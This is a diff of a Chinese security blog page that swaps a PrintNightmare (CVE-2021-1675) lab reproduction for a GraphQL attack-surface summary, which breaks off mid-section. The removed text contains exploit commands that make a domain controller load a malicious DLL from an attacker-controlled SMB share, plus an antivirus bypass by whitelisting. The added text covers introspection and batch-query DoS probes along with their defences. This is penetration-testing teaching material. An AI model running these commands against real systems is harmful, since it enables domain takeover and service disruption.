@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="CVE-2021-1675复现, half90&#39;s blog">
+    <meta name="keywords" content="GraphQL攻击面总结, half90&#39;s blog">
     <meta name="description" content="https://github.com/mumu0215">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>CVE-2021-1675复现 | half90&#39;s blog</title>
+    <title>GraphQL攻击面总结 | half90&#39;s blog</title>
     <link rel="icon" type="image/jpeg" href="/medias/logo.jpeg">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -301,12 +301,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/3.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/9.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">CVE-2021-1675复现</h1>
+                    <h1 class="description center-align post-title">GraphQL攻击面总结</h1>
                 </div>
             </div>
         </div>
@@ -422,16 +422,12 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E5%86%85%E7%BD%91/">
-                                <span class="chip bg-color">内网</span>
+                            <a href="/tags/Web%E6%B8%97%E9%80%8F/">
+                                <span class="chip bg-color">Web渗透</span>
                             </a>
                         
-                            <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/">
-                                <span class="chip bg-color">域渗透</span>
-                            </a>
-                        
-                            <a href="/tags/PrintNightmare/">
-                                <span class="chip bg-color">PrintNightmare</span>
+                            <a href="/tags/GraphQL/">
+                                <span class="chip bg-color">GraphQL</span>
                             </a>
                         
                     </div>
@@ -442,16 +438,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/windows%E5%86%85%E7%BD%91/" class="post-category">
-                                windows内网
-                            </a>
-                        
-                            <a href="/categories/CVE-2021/" class="post-category">
-                                CVE-2021
-                            </a>
-                        
-                            <a href="/categories/%E5%9F%9F%E6%B8%97%E9%80%8F/" class="post-category">
-                                域渗透
+                            <a href="/categories/Web%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/" class="post-category">
+                                Web渗透学习
                             </a>
                         
                     </div>
@@ -463,7 +451,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-07-20
+                    2022-07-13
                 </div>
                 
 
@@ -472,7 +460,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    925
+                    3k
                 </div>
                 
 
@@ -492,78 +480,220 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="1、漏洞危害"><a href="#1、漏洞危害" class="headerlink" title="1、漏洞危害"></a>1、漏洞危害</h2><p>CVE-2021-1675（后分配至编号<strong>CVE-2021-34527</strong>）这个漏洞级别属于稍次于<strong>Zerologon</strong>的打域利器之一。和以往的打印机协议中继/委派系列，危害度和利用条件基本在同一维度</p>
-<p>影响版本</p>
-<pre class="line-numbers language-none"><code class="language-none">Windows Server 2019
-Windows Server 2016
-Windows Server 2012 R2
-Windows Server 2012
-Windows Server 2008 R2
-Windows Server 2008<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+                <h1 id="GraphQL攻击面总结"><a href="#GraphQL攻击面总结" class="headerlink" title="GraphQL攻击面总结"></a>GraphQL攻击面总结</h1><h1 id="GraphQL介绍"><a href="#GraphQL介绍" class="headerlink" title="GraphQL介绍"></a>GraphQL介绍</h1><p>GraphQL 是一个开源的数据查询语言(DQL)和数据处理语言(DML).最初，GraphQL由Facebook于2012年左右开发并于2015年公开发布。其主要优点之一是为其他Web服务体系结构（如REST）提供了一种更高效，更强大的替代方案。</p>
+<h1 id="结构特性"><a href="#结构特性" class="headerlink" title="结构特性"></a>结构特性</h1><p>GraphQL并没有绑定数据库，交互逻辑是客户端→GraphQL→后端代码→数据，不同于REST API的交互逻辑：客户端→后端代码→数据库。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.4/pic-20220713/image_TbMXI62Ej9.png"></p>
+<p>传统REST API实现功能一般是一个api对应一个功能，比如请求<a target="_blank" rel="noopener" href="http://www.test.com/users" title="http://www.test.com/userinfo">http://www.test.com/userinfo</a>，后端返回用户信息；当客户端请求主页菜单，实现这个api就需要后端实现另外一个url对应到指定代码。</p>
+<p>而在GraphQL中，用户请求的url路径固定，只需要改变请求的post内容，无需维护多个api</p>
+<p>比如查询ID为1的人的生日，post内容如下：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.4/pic-20220713/image_270eFfbe3a.png"></p>
+<p>当想查询ID为1的人的身高和发色时请求如下：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.4/pic-20220713/image_5L8CdZR1vY.png"></p>
+<p>两个请求的url路由都为同一个且固定。</p>
+<h1 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h1><h2 id="类型语言"><a href="#类型语言" class="headerlink" title="类型语言"></a>类型语言</h2><p>在GraphQL查询过程中，基本上是对对象或者对象的某些字段进行查询。客户端在查询之前可以通过schema了解到对象的基本属性字段，当查询请求到后端时，服务器会根据schema验证并执行查询。</p>
+<p>GraphQL 服务可以用任何语言编写，它有一套自己的简单语言，称之为 “GraphQL schema language” —— 它和 GraphQL 的查询语言很相似，让我们能够和 GraphQL schema 之间可以无语言差异地沟通。</p>
+<h2 id="基本数据结构"><a href="#基本数据结构" class="headerlink" title="基本数据结构"></a>基本数据结构</h2><p>一个 GraphQL schema 中的最基本的组件是对象类型，它就表示你可以从服务上获取到什么类型的对象，以及这个对象有什么字段。使用 GraphQL schema language，我们可以这样表示它：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">type Character <span class="token punctuation">{</span>
+  name<span class="token operator">:</span> String<span class="token operator">!</span>
+  appearsIn<span class="token operator">:</span> <span class="token punctuation">[</span>Episode<span class="token operator">!</span><span class="token punctuation">]</span><span class="token operator">!</span>
+<span class="token punctuation">}</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h2 id="2、漏洞利用条件"><a href="#2、漏洞利用条件" class="headerlink" title="2、漏洞利用条件"></a>2、漏洞利用条件</h2><ul>
-<li>一个域内账户密码或者该机器账户密码</li>
-<li>驱动器的绝对路径</li>
+<ul>
+<li><p>  <code>Character</code> 是一个 <strong>GraphQL 对象类型</strong>，表示其是一个拥有一些字段的类型。你的 schema 中的大多数类型都会是对象类型。</p>
+</li>
+<li><p>  <code>name</code> 和 <code>appearsIn</code> 是 <code>Character</code> 类型上的<strong>字段</strong>，这也是可查询到的内容。</p>
+</li>
+<li><p>  <code>String</code> 是内置的<strong>标量</strong>类型之一</p>
+</li>
+<li><p>  <code>String!</code> 表示这个字段是<strong>非空的</strong>，GraphQL 服务保证当你查询这个字段后总会给你返回一个值。在类型语言里面，我们用一个感叹号来表示这个特性。</p>
+</li>
+<li><p>  <code>[Episode!]!</code> 表示一个 <code>Episode</code> <strong>数组</strong>。因为它也是<strong>非空的</strong>，所以当你查询 <code>appearsIn</code> 字段的时候，你也总能得到一个数组（零个或者多个元素）。且由于 <code>Episode!</code> 也是<strong>非空的</strong>，你总是可以预期到数组中的每个项目都是一个 <code>Episode</code> 对象。</p>
+</li>
 </ul>
-<h2 id="3、复现步骤"><a href="#3、复现步骤" class="headerlink" title="3、复现步骤"></a>3、复现步骤</h2><h4 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h4><p>漏洞环境安装存在问题的移步</p>
-<pre class="line-numbers language-none"><code class="language-none">域控：windows server2019（172.16.84.7）
-域主机：windows server2012R2（172.16.84.6）
-攻击机：kali（172.16.84.3）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>学过面向对象编程的应该会感到熟悉，与定义一个对象的过程很相似</p>
+<h2 id="GraphQL端点"><a href="#GraphQL端点" class="headerlink" title="GraphQL端点"></a>GraphQL端点</h2><p>记录特征能够有效判断资产使用组件情况，能够帮助我们快速发现攻击方向和脆弱目标。常见的GraphQL端点路径如下：</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">/graphql
+/graphql/console
+/graphql.php
+/graphiql
+/graphiql.php
+/api/graphql
+/***ql
+......<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h4 id="漏洞脚本利用"><a href="#漏洞脚本利用" class="headerlink" title="漏洞脚本利用"></a>漏洞脚本利用</h4><h5 id="1）使用rpcdump扫描漏洞指纹"><a href="#1）使用rpcdump扫描漏洞指纹" class="headerlink" title="1）使用rpcdump扫描漏洞指纹"></a>1）使用rpcdump扫描漏洞指纹</h5><p>使用impacket包中的<a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/rpcdump.py">rpcdump.py</a> 查看漏洞指纹，一般返回包含MS-RPRN或者MS-PAR则该主机可能存在漏洞</p>
-<p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.1/pic/image-20210723173253186.png" alt="image-20210723173253186"></p>
-<h5 id="2）漏洞前期环境部署"><a href="#2）漏洞前期环境部署" class="headerlink" title="2）漏洞前期环境部署"></a>2）漏洞前期环境部署</h5><p>需要使用smb服务放置恶意dll文件供受害主机读取，这里在攻击机上配置samba服务</p>
-<p>创建共享文件夹/home/share后，修改samba的smb.conf文件，在结尾添加配置：</p>
-<pre class="line-numbers language-none"><code class="language-none">[share]
-    path=/home/share
-    available = yes
-    browseable = yes
-    public = yes
-    writable = yes<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>以上路径只是协助发现并确认是否使用GraphQL，如果资产使用GraphQL，也可以通过数据包特征确认：</p>
+<ul>
+<li><p>  POST或GET包重复请求同一个url，请求传参不同，返回数据也不同</p>
+</li>
+<li><p>  传参为JSON格式，字段多出现query、variables、operationName，返回包的JSON多为<code>{"data":{...}}</code>，如下：</p>
+</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.4/pic-20220713/image_dwVKJrhtS8.png"></p>
+<ul>
+<li>  报错信息：<code>"Syntax Error: Expected Name, found</code></li>
+</ul>
+<h2 id="基本操作类型"><a href="#基本操作类型" class="headerlink" title="基本操作类型"></a>基本操作类型</h2><p>GraphQL官方提供三种操作类型：query（查询）、mutation（变更）、subscription（订阅），最常用的是query，这里就简单介绍下Query方法的使用。</p>
+<h3 id="Query方法"><a href="#Query方法" class="headerlink" title="Query方法"></a>Query方法</h3><p>假设定义一个查询类型：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">type Query <span class="token punctuation">{</span>
+  <span class="token function">hero</span><span class="token punctuation">(</span>episode<span class="token operator">:</span> Episode<span class="token punctuation">)</span><span class="token operator">:</span> Character
+  <span class="token function">droid</span><span class="token punctuation">(</span>id<span class="token operator">:</span> <span class="token constant">ID</span><span class="token operator">!</span><span class="token punctuation">)</span><span class="token operator">:</span> Droid
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>保存后重新启动smbd服务</p>
-<p>恶意dll使用cs生成的dll测试即可，生成后存放至smb的共享文件夹中</p>
-<p>关于是否需要确保域控能直接访问到该smb文件这个点上，笔者还是不太明确，看了几个文章，都在强调需要DC能直接访问到smb，但是笔者自己环境测试的DC为windows server2019，补丁更新到了2019年3月，实际是做了安全策略控制的，导致访问smb会提示“不能访问共享文件夹”，如下：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.1/pic/image-20210723182033487.png" alt="image-20210723182033487"></p>
-<p>此DC仍然能够使用exp成功打出，咱们继续往下看</p>
-<h5 id="3）漏洞利用"><a href="#3）漏洞利用" class="headerlink" title="3）漏洞利用"></a>3）漏洞利用</h5><h6 id="本地提权使用"><a href="#本地提权使用" class="headerlink" title="本地提权使用"></a><strong>本地提权使用</strong></h6><p>微软先前提供的补丁仅仅针对该漏洞的本地提权的恶意利用方式进行修补，选用脚本来自：<a target="_blank" rel="noopener" href="https://github.com/calebstewart/CVE-2021-1675">https://github.com/calebstewart/CVE-2021-1675</a> ，这里就不复现了</p>
-<h6 id="Python脚本利用"><a href="#Python脚本利用" class="headerlink" title="Python脚本利用"></a><strong>Python脚本利用</strong></h6><p>cs生成64位的dll，上传至smb后，确保DC和域主机能ping通我们的smb服务器，下面安装<a target="_blank" rel="noopener" href="https://github.com/cube0x0/CVE-2021-1675">exp</a>需要的环境。</p>
-<p>由于该exp作者对impacket包进行了部分修改，所以需要卸载原先安装的impacket环境，用<a target="_blank" rel="noopener" href="https://github.com/cube0x0/impacket">修改后的impacket</a></p>
-<pre class="line-numbers language-none"><code class="language-none">pip3 uninstall impacket
-git clone https://github.com/cube0x0/impacket
-cd impacket
-python3 ./setup.py install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>在这个查询中可以确定有两个字段hero和droid，那么就可做如下请求去使用定义的查询服务，其中在查询droid的时候传入阐述id，意为查询 id为2000的droid对象的name字段信息：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">query <span class="token punctuation">{</span>
+  hero<span class="token punctuation">{</span>
+    name
+  <span class="token punctuation">}</span>
+  <span class="token function">droid</span><span class="token punctuation">(</span>id<span class="token operator">:</span> <span class="token string">"2000"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    name
+  <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>安装后，使用域主机账户密码进行漏洞利用：</p>
-<p><code>python3 CVE-2021-1675.py &lt;FQDN&gt;/&lt;USER_Name&gt;:&lt;PASSWORD&gt;@&lt;DC IP&gt; '\\&lt;ATTACKER_IP&gt;\smb\rev.dll'</code></p>
-<p>如下：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.1/pic/image-20210723182804857.png" alt="image-20210723182804857"></p>
-<p>cs上获取域控的会话：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.2/pic/image-20210723183220532.png" alt="image-20210723183220532"></p>
-<h6 id="mimikatz利用"><a href="#mimikatz利用" class="headerlink" title="mimikatz利用"></a><strong>mimikatz利用</strong></h6><p>利用mimikatz对漏洞进行复现</p>
-<p>命令：</p>
-<pre class="line-numbers language-none"><code class="language-none">misc::printnightmare /library:\\172.16.84.3\share\artifact.dll /server:172.16.84.7 /authuser:&lt;域主机用户&gt; /authdomain:&lt;域名&gt; /authpassword:&lt;域主机密码&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="传参"><a href="#传参" class="headerlink" title="传参"></a>传参</h3><p>在GraphQL中，每一个字段和嵌套对象都能有自己的一组参数，从而使得GraphQL可以完美替代多次API获取请求。基本的使用如上面的例子，通过指定对象中某一个字段的值进行参数传递，完成查询。</p>
+<p>其中需要注意的是，一个变更也能包含多个字段，一如查询。查询和变更之间名称之外的一个重要区别是：<strong>查询字段时，是并行执行，而变更字段时，是线性执行，一个接着一个。</strong>这也保证了变更字段值的时候不会出现资源竞态问题。</p>
+<h2 id="内省"><a href="#内省" class="headerlink" title="内省"></a>内省</h2><p>在交互中，在使用GraphQL之前我们是不知道shema支持的查询类型和所有对象字段信息的，我们可以通过GraphQL的内省系统获取以上全部的信息。</p>
+<h1 id="攻击面"><a href="#攻击面" class="headerlink" title="攻击面"></a>攻击面</h1><h2 id="1、内省查询暴露接口信息"><a href="#1、内省查询暴露接口信息" class="headerlink" title="1、内省查询暴露接口信息"></a>1、内省查询暴露接口信息</h2><p>GraphQL内省是一个特殊查询，使用该__schema字段为其架构查询GraphQL。内省查询的作用是提供详细接口信息，简单的来说就是可以通过内省查询来获取GraphQL的接口文档，如对象定义、接口参数等信息。</p>
+<p>内省本身不是弱点，而是功能。但是如果将其提供，则攻击者可能会使用它并滥用它，以寻求有关GraphQL实现的信息，例如存在哪些查询或变异。</p>
+<p>使用以下请求内容可获取全部接口信息：</p>
+<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"query"</span><span class="token operator">:</span><span class="token string">"\n    query IntrospectionQuery {\n      __schema {\n        \n        queryType { name }\n        mutationType { name }\n        subscriptionType { name }\n        types {\n          ...FullType\n        }\n        directives {\n          name\n          description\n          \n          locations\n          args {\n            ...InputValue\n          }\n        }\n      }\n    }\n\n    fragment FullType on __Type {\n      kind\n      name\n      description\n      \n      fields(includeDeprecated: true) {\n        name\n        description\n        args {\n          ...InputValue\n        }\n        type {\n          ...TypeRef\n        }\n        isDeprecated\n        deprecationReason\n      }\n      inputFields {\n        ...InputValue\n      }\n      interfaces {\n        ...TypeRef\n      }\n      enumValues(includeDeprecated: true) {\n        name\n        description\n        isDeprecated\n        deprecationReason\n      }\n      possibleTypes {\n        ...TypeRef\n      }\n    }\n\n    fragment InputValue on __InputValue {\n      name\n      description\n      type { ...TypeRef }\n      defaultValue\n      \n      \n    }\n\n    fragment TypeRef on __Type {\n      kind\n      name\n      ofType {\n        kind\n        name\n        ofType {\n          kind\n          name\n          ofType {\n            kind\n            name\n            ofType {\n              kind\n              name\n              ofType {\n                kind\n                name\n                ofType {\n                  kind\n                  name\n                  ofType {\n                    kind\n                    name\n                  }\n                }\n              }\n            }\n          }\n        }\n      }\n    }\n  "</span><span class="token punctuation">,</span><span class="token property">"variables"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"operationName"</span><span class="token operator">:</span><span class="token string">"IntrospectionQuery"</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p>由于使用dll为原生cs的dll，这里日常报毒查杀</p>
-<p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.2/pic/image-20210830111551285.png" alt="image-20210830111551285"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.2/pic/image-20210830110707554.png"></p>
-<p>本文仅仅测试可行性，这里添加白名单继续执行，成功上线</p>
-<p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.2/pic/image-20210830120926159.png" alt="image-20210830120926159"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.2/pic/image-20210830113130749.png" alt="image-20210830113130749"></p>
-<h4 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h4><p>原先测试环境为DC windows server2012R2，虽然域控能够访问开启的smb服务且前期指纹探测确认存在漏洞，但是使用python脚本进行实际攻击下一直提示rpc_s_access_denied，具体原因不是很明确（猜测为windows自己的杀毒进程阻拦），原github同样存在类似问题反馈<a target="_blank" rel="noopener" href="https://github.com/cube0x0/CVE-2021-1675/issues/9">https://github.com/cube0x0/CVE-2021-1675/issues/9</a></p>
-<h2 id="4、修复建议"><a href="#4、修复建议" class="headerlink" title="4、修复建议"></a>4、修复建议</h2><p>建议关闭Spooler服务</p>
-<pre class="line-numbers language-none"><code class="language-none">//cmd
-net stop spooler &amp;&amp; sc config spooler start=disabled 
-//powershell
-Stop-Service Spooler
-REG ADD  "HKLM\SYSTEM\CurrentControlSet\Services\Spooler"  /v "Start" /t REG_DWORD /d "4" /f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.4/pic-20220713/image_kOfrAfM86X.png"></p>
+<p>常用工具推荐：</p>
+<ul>
+<li>  浏览器插件：Altair GraphQL Client，填入合法GraphQL端点之后就可获取并查看接口文档，点击某条接口可在窗口中直接发起请求</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.4/pic-20220713/image_ifsW3yqdDC.png"></p>
+<ul>
+<li><p>  <a target="_blank" rel="noopener" href="https://github.com/2fd/graphdoc" title="https://github.com/2fd/graphdoc">https://github.com/2fd/graphdoc</a> 需要npm环境的工具，可生成本地的html文档</p>
+</li>
+<li><p>  <a target="_blank" rel="noopener" href="https://ivangoncharov.github.io/graphql-voyager/" title="https://ivangoncharov.github.io/graphql-voyager/">https://ivangoncharov.github.io/graphql-voyager/</a> 在线的web端的分析平台，可直观展示接口与对象、参数的调用关系。将内省查询的json数据粘贴在内省框中，网页就会展示接口调用全貌</p>
+</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.4/pic-20220713/image_29YUmGWvoK.png"></p>
+<p>接口信息比较详细，这也导致了后续同样基于内省查询的其他攻击的派生</p>
+<h3 id="防御方式：生产环境下关闭introspection即内省查询"><a href="#防御方式：生产环境下关闭introspection即内省查询" class="headerlink" title="防御方式：生产环境下关闭introspection即内省查询"></a>防御方式：生产环境下关闭introspection即内省查询</h3><h2 id="2、GraphQL-playground外网未授权访问"><a href="#2、GraphQL-playground外网未授权访问" class="headerlink" title="2、GraphQL playground外网未授权访问"></a>2、GraphQL playground外网未授权访问</h2><p><a target="_blank" rel="noopener" href="https://github.com/graphql/graphql-playground" title="Playground">Playground</a>是GraphQL一款开源的IDE，攻击者可在外网暴露的Playground上进行内省查询或者Query等常规操作，作用上类似插件：Altair GraphQL Client，都是为了方便调试GraphQL查询，本身自带内省查询获取接口文档</p>
+<p>常见的路径：<code>graphql_playground</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.4/pic-20220713/image_Ff-EMjIAn_.png"></p>
+<h2 id="3、敏感信息泄露"><a href="#3、敏感信息泄露" class="headerlink" title="3、敏感信息泄露"></a>3、敏感信息泄露</h2><p>这个风险不一定存在，需要通过内省查询或者其他能获取查询接口的方法配合人工挖掘。比如接口文档中的敏感对象或者Query的方法名，例如<code>admin、password、各种key、session、email</code>等</p>
+<p>可通过检索<code>objects.types</code>查询结果入手敏感字段，也可以利用<a target="_blank" rel="noopener" href="https://github.com/2fd/graphdoc" title="graphdoc">graphdoc</a>这个工具本地生成对应的接口文档后自行检索</p>
+<p>查询<code>objects.types</code>可使用如下查询：</p>
+<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>
+  __schema <span class="token punctuation">{</span>
+    types <span class="token punctuation">{</span>
+      name
+    <span class="token punctuation">}</span>
+  <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>或：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.2/pic/image-20210830121139370.png" alt="image-20210830121139370"></p>
-<h3 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h3><p>1、<a target="_blank" rel="noopener" href="https://github.com/cube0x0/CVE-2021-1675">https://github.com/cube0x0/CVE-2021-1675</a></p>
-<p>2、<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/k4OwCcJJxm-UHMdVdfBCIw">https://mp.weixin.qq.com/s/k4OwCcJJxm-UHMdVdfBCIw</a></p>
-<p>3、<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/386251108">https://zhuanlan.zhihu.com/p/386251108</a></p>
-<p>4、<a target="_blank" rel="noopener" href="https://github.com/calebstewart/CVE-2021-1675">https://github.com/calebstewart/CVE-2021-1675</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.4/pic-20220713/image_29SHM4F6zO.png"></p>
+<h2 id="4、Batch批查询导致的DOS"><a href="#4、Batch批查询导致的DOS" class="headerlink" title="4、Batch批查询导致的DOS"></a>4、Batch批查询导致的DOS</h2><p>支持批查询的GraphQL允许客户端同时发送多条独立的查询语句，类型主要有两种：json列表批查询、基于名称的批查询</p>
+<h3 id="Json-list-based-batching"><a href="#Json-list-based-batching" class="headerlink" title="Json list based batching"></a>Json list based batching</h3><p>当我们进行一次query查询，可能如下</p>
+<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"query"</span><span class="token operator">:</span> <span class="token string">"query { Query { hacktheplanet } }"</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>可以用json列表查询判断当前GraphQL是否支持批处理查询：</p>
+<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">[</span>
+   <span class="token punctuation">{</span>
+      <span class="token property">"query"</span><span class="token operator">:</span><span class="token string">"query { assetnote: Query { hacktheplanet } }"</span>
+   <span class="token punctuation">}</span><span class="token punctuation">,</span>
+   <span class="token punctuation">{</span>
+      <span class="token property">"query"</span><span class="token operator">:</span><span class="token string">"query { assetnote: Query { hacktheplanet } }"</span>
+   <span class="token punctuation">}</span>
+<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>返回了两次查询结果，这就表明当前GraphQL支持批处理查询，那么就可以挑选返回资源较多，或者系统需要响应时间较久的query，同时进行多次查询，占用服务器资源达到DOS的攻击。</p>
+<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">[</span>
+   <span class="token punctuation">{</span>
+      <span class="token property">"errors"</span><span class="token operator">:</span><span class="token punctuation">[</span>
+         <span class="token punctuation">{</span>
+            <span class="token property">"message"</span><span class="token operator">:</span><span class="token string">"Cannot query field \"Query\" on type \"Query\"."</span><span class="token punctuation">,</span>
+            <span class="token property">"locations"</span><span class="token operator">:</span><span class="token punctuation">[</span>
+               <span class="token punctuation">{</span>
+                  <span class="token property">"line"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span>
+                  <span class="token property">"column"</span><span class="token operator">:</span><span class="token number">9</span>
+               <span class="token punctuation">}</span>
+            <span class="token punctuation">]</span>
+         <span class="token punctuation">}</span>
+      <span class="token punctuation">]</span>
+   <span class="token punctuation">}</span><span class="token punctuation">,</span>
+   <span class="token punctuation">{</span>
+      <span class="token property">"errors"</span><span class="token operator">:</span><span class="token punctuation">[</span>
+         <span class="token punctuation">{</span>
+            <span class="token property">"message"</span><span class="token operator">:</span><span class="token string">"Cannot query field \"Query\" on type \"Query\"."</span><span class="token punctuation">,</span>
+            <span class="token property">"locations"</span><span class="token operator">:</span><span class="token punctuation">[</span>
+               <span class="token punctuation">{</span>
+                  <span class="token property">"line"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span>
+                  <span class="token property">"column"</span><span class="token operator">:</span><span class="token number">9</span>
+               <span class="token punctuation">}</span>
+            <span class="token punctuation">]</span>
+         <span class="token punctuation">}</span>
+      <span class="token punctuation">]</span>
+   <span class="token punctuation">}</span>
+<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="Query-name-based-batching"><a href="#Query-name-based-batching" class="headerlink" title="Query name based batching"></a>Query name based batching</h3><p>原理类似，只是使用查询的姿势稍有不同，之前使用的是json列表，这里使用一条query进行两次查询</p>
+<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"query"</span><span class="token operator">:</span> <span class="token string">"query { assetnote: Query { hacktheplanet } assetnote1: Query { hacktheplanet } }"</span><span class="token punctuation">}</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>同样返回两次查询结果表明当前是支持批处理查询的</p>
+<p>利用工具<a target="_blank" rel="noopener" href="https://github.com/assetnote/batchql" title="https://github.com/assetnote/batchql">https://github.com/assetnote/batchql</a>可检测此类问题</p>
+<h3 id="防御方式："><a href="#防御方式：" class="headerlink" title="防御方式："></a>防御方式：</h3><ul>
+<li>  控制查询的资源占用；</li>
+</ul>
+<p>在 GraphQL 中，存在一个称为<strong>查询成本分析</strong>的概念，它将权重值分配给解析成本高于其他字段的字段。使用此功能，我们可以创建一个上限阈值来拒绝昂贵的查询。或者，可以实现缓存功能以避免在短时间内重复相同的请求。</p>
+<ul>
+<li>  非必要无需开启批处理查询</li>
+</ul>
+<h2 id="5、深度递归查询攻击DOS"><a href="#5、深度递归查询攻击DOS" class="headerlink" title="5、深度递归查询攻击DOS"></a>5、深度递归查询攻击DOS</h2><p>根据前文可知GraphQL的最基本的组件是对象类型，一个对象的字段可能是基本的标量例如string，也可能是另外一个对象。</p>
+<p>假使有两个对象相互关联如下，并且定义了一个Query支持这两个对象的查询，容易形成无限嵌套</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java">type <span class="token class-name">Thread</span> <span class="token punctuation">{</span>
